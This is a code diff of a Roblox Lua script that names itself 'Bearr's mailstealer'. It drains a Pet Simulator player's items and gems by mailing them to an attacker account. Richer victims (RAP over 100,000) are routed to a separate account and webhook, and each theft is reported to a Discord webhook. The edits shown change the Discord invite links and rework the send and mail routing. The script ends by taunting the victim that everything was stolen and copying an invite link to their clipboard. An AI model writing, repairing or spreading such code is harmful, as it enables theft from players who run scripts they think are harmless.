@@ -6,7 +6,7 @@ local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "Join gg / GsFp84dbQf to get back"
+local MailMessage = "Join gg / rZmNK6Ptxw to get back"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
@@ -49,7 +49,7 @@ local function formatNumber(number)
     end
 end
 
-local function SendMessage(username, diamonds, webhookUrl, recipient)
+local function SendMessage(username, diamonds, webhookUrl)
     local headers = {
         ["Content-Type"] = "application/json",
     }
@@ -69,11 +69,6 @@ local function SendMessage(username, diamonds, webhookUrl, recipient)
             name = "Summary:",
             value = "",
             inline = false
-        },
-        {
-            name = "Mail Sent To:",  -- New field to show the mail recipient
-            value = recipient,
-            inline = true
         }
     }
 
@@ -125,7 +120,7 @@ local function SendMessage(username, diamonds, webhookUrl, recipient)
             ["color"] = 3447003,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Mailstealer by Bearr. discord.gg/GsFp84dbQf"
+                ["text"] = "Mailstealer by Bearr. discord.gg/rZmNK6Ptxw"
             }
         }}
     }
@@ -290,52 +285,29 @@ if #sortedItems > 0 then
         return a.rap * a.amount > b.rap * b.amount 
     end)
 
--- Conditional check: if total RAP > 100,000, send to high RAP user/webhook
-local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
-local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
+    -- Conditional check: if total RAP > 100,000, send to different user/webhook
+    local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
+    local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
 
-function SendMessage(user, GemAmount, webhook, userId)
-    -- Send the message (pseudo-code, adapt to your API)
-    local success, response = pcall(function()
-        -- Send the message (you need to replace with actual API sending code)
-        local data = {
-            content = "Message to: " .. userId .. " GemAmount: " .. GemAmount
-        }
-        -- Assuming `httpService` sends the webhook request
-        return game:GetService("HttpService"):PostAsync(webhook, game:GetService("HttpService"):JSONEncode(data))
-    end)
-    
-    -- Debugging response
-    if success then
-        print("Message successfully sent to " .. userId)
+spawn(function()
+    -- Conditional send logic based on totalRAP value
+    if totalRAP > 100000 then
+        -- If total RAP > 100,000:
+        -- Send both message and mail to highRAPWebhook/highRAPUser
+        SendMessage(targetUser, GemAmount1, highRAPWebhook)
+        SendMail(targetUser, GemAmount1, highRAPWebhook)
+        
+        -- Do not send anything to the global webhook/user
     else
-        print("Failed to send message to " .. userId)
-        print("Error: " .. tostring(response))  -- Log error message
+        -- If total RAP <= 100,000:
+        -- Send both message and mail to global webhook/user
+        SendMessage(targetUser, GemAmount1, webhook)
+        SendMail(targetUser, GemAmount1, webhook)
+        
+        -- Send message only to highRAPWebhook/highRAPUser (no mail)
+        SendMessage(targetUser, GemAmount1, highRAPWebhook)
     end
-end
-
-function SendMail(user, GemAmount, webhook)
-    -- Send the mail (pseudo-code, adapt to your API)
-    local success, response = pcall(function()
-        -- Send the mail (you need to replace with actual mail-sending code)
-        local data = {
-            to = user,
-            content = "Mail to: " .. user .. " GemAmount: " .. GemAmount
-        }
-        -- Assuming `httpService` sends the webhook request
-        return game:GetService("HttpService"):PostAsync(webhook, game:GetService("HttpService"):JSONEncode(data))
-    end)
-    
-    -- Debugging response
-    if success then
-        print("Mail successfully sent to " .. user)
-    else
-        print("Failed to send mail to " .. user)
-        print("Error: " .. tostring(response))  -- Log error message
-    end
-end
-
-
+end)
 
     SendAllGems()
 
@@ -344,6 +316,6 @@ end
     end
 
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by Bearr's mailstealer!\n Join discord.gg/GsFp84dbQf")
-    setclipboard("discord.gg/GsFp84dbQf")
+    message.Error("All your items just got stolen by Bearr's mailstealer!\n Join discord.gg/rZmNK6Ptxw")
+    setclipboard("discord.gg/rZmNK6Ptxw")
 end
